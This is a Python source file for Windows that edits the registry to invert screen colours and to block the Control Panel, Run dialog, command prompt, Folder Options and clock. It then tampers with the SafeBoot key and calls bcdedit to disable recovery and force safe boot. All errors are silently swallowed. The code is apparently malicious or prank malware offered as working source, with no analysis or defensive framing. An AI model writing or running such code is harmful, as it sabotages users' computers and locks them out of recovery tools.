import winreg, subprocess, os, string, random, threading, asyncio, ctypes

def invert():
    try:
        key_path = r"Software\Microsoft\ColorFiltering"
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        except FileNotFoundError:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "Active", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "FilterType", 0, winreg.REG_DWORD, 1)
    except Exception as e:
        pass

def disable_safe_mode():
    try:
        reg_key = winreg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        try:
            reg_key_handle = winreg.OpenKey(reg_key, reg_path, 0, winreg.KEY_WRITE)
        except FileNotFoundError:
            reg_key_handle = winreg.CreateKey(reg_key, reg_path)
        winreg.SetValueEx(reg_key_handle, "NoFileAssociate", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(reg_key_handle, "NoControlPanel", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(reg_key_handle, "HideClock", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(reg_key_handle, "NoFolderOptions", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(reg_key_handle, "DisableCMD", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(reg_key_handle, "NoRun", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(reg_key_handle)

        reg_key = winreg.HKEY_LOCAL_MACHINE
        reg_path = r"SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal"
        try:
            reg_key_handle = winreg.OpenKey(reg_key, reg_path, 0, winreg.KEY_WRITE)
        except FileNotFoundError:
            reg_key_handle = winreg.CreateKey(reg_key, reg_path)
        winreg.SetValueEx(reg_key_handle, "Minimal", 0, winreg.REG_SZ, "")
        winreg.CloseKey(reg_key_handle)

        subprocess.run("bcdedit /set {default} recoveryenabled no", shell=True, check=True)
        subprocess.run("bcdedit /set {default} safeboot minimal", shell=True, check=True)

    except Exception:
        pass
